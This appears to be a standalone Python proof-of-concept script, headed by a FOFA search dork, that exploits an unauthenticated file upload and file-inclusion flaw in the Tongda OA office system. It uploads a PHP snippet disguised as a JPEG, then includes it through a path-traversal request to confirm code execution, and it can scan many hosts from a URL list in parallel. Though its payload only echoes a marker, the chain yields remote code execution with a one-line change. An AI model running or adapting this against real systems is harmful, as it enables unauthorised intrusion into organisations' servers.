#FOFA: title=“通达OA 网络智能办公系统”

import requests
import re
import argparse
import urllib3
import urllib
from urllib.parse import urlparse
from multiprocessing.dummy import Pool
import random
import string
import json

urllib3.disable_warnings()

proxy = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

def banner():
    info = """
   _____                __          __        _        _                 
  / ____|               \ \        / /       | |      | |                
 | |  __ _ __ __ _ ___ __\ \  /\  / /__  _ __| | _____| |__   ___  _ __  
 | | |_ | '__/ _` / __/ __\ \/  \/ / _ \| '__| |/ / __| '_ \ / _ \| '_ \ 
 | |__| | | | (_| \__ \__ \\  /\  / (_) | |  |   <\__ \ | | | (_) | |_) |
  \_____|_|  \__,_|___/___/ \/  \/ \___/|_|  |_|\_\___/_| |_|\___/| .__/ 
                                                                  | |    
                                                                  |_|    
"""
    print(info)

def poc(target):
    result = {
        'name': '通达OA 任意文件包含+未授权文件上传',
        'vulnerable': False,
        'url': target
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<?php echo "{randstr1}"."{randstr2}";?>'
    payload = '/ispirit/im/upload.php'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3',
    }
    vurl = urllib.parse.urljoin(target, payload)
    data = '------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n\r\n2\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="P"\r\n\r\n\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3\r\nContent-Disposition: form-data; name="ATTACHMENT"; filename="jpg"\r\nContent-Type: image/jpeg\r\n\r\n{0}\r\n------WebKitFormBoundaryBwVAwV3O4sifyhr3--'.format(shell)
    verify_path = '/ispirit/interface/gateway.php?json={{"url":"/general/../../attach/im/{0}"}}'
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and re.search('OK', rep.text):
            path = re.findall('@(.+)\|jpg', rep.text)[0].replace('_', '/') + '.jpg'
            verify_url = urllib.parse.urljoin(target, verify_path.format(path))
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'},verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
                print(result)
    except:
        print(f"{target}访问失败")

def main():
    parser = argparse.ArgumentParser("通达OA 任意文件包含+未授权文件上传漏洞检测POC")
    parser.add_argument("-u", "--url", dest="url", help="Insert URL")
    parser.add_argument("-f", "--file", dest="file", help="Insert URLs file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r') as uf:
            urls = []
            for u in uf.readlines():
                urls.append(u.strip())
            mp = Pool(10)
            mp.map(poc, urls)
            mp.close()
            mp.join()
    else:
        print("输入有误，请检查")

if __name__ == '__main__':
    banner()
    main()